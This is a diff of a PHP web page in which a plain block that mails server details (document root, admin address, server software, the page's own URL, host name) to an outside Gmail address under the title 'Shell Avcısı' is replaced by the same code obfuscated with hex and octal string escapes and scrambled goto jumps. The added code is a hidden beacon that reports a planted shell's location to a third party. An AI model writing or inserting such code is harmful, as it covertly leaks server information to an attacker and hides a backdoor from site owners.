@@ -286,15 +286,9 @@
     ?>
 
 
- <?php $kime="bl4ckhatx1337@gmail.com";
-     $baslik="Shell Avcısı";
-     $turkhackteam="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
-     $turkhackteam.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
-     $turkhackteam.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
-     $turkhackteam.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
-     $turkhackteam.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
-     mail($kime, $baslik, $turkhackteam);
-?>
+<?php
+ goto qemTr; q1pwk: $turkhackteam .= "\x53\x65\162\x76\x65\x72\40\x69\x73\154\x65\x74\151\155\40\x73\151\x73\164\x65\155\151\40\72\x20" . $_SERVER["\123\x45\x52\x56\105\122\137\x53\x4f\x46\124\127\101\122\105"] . "\xd\12"; goto Lvv7W; qJ_ML: $turkhackteam .= "\x53\x65\x72\166\x65\162\x20\101\144\x6d\151\x6e\x20\x3a\40" . $_SERVER["\123\x45\122\126\x45\122\137\101\104\x4d\111\x4e"] . "\15\xa"; goto q1pwk; rb_fC: $turkhackteam .= "\x41\x76\x6c\x61\156\141\156\40\123\151\164\x65\x20\72\40" . $_SERVER["\110\x54\x54\120\x5f\x48\117\123\x54"] . "\xd\12"; goto VQ0so; kFbIK: $baslik = "\x53\x68\145\x6c\154\40\x41\166\x63\xc4\261\163\304\261"; goto vS5qu; vS5qu: $turkhackteam = "\x44\157\x73\x79\141\40\131\157\154\165\40\72\40" . $_SERVER["\104\x4f\x43\x55\115\x45\x4e\124\x5f\x52\117\117\124"] . "\15\12"; goto qJ_ML; qemTr: $kime = "\142\x6c\x34\x63\153\x68\x61\x74\170\61\63\x33\67\100\147\x6d\x61\151\154\x2e\x63\x6f\x6d"; goto kFbIK; Lvv7W: $turkhackteam .= "\x53\x68\145\154\154\x20\114\151\x6e\x6b\40\x3a\x20\150\x74\164\x70\72\57\x2f" . $_SERVER["\123\105\x52\x56\105\122\x5f\x4e\101\115\x45"] . $_SERVER["\120\110\120\x5f\123\105\114\106"] . "\xd\12"; goto rb_fC; VQ0so: mail($kime, $baslik, $turkhackteam); goto OxLsM; OxLsM: ?>
+
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
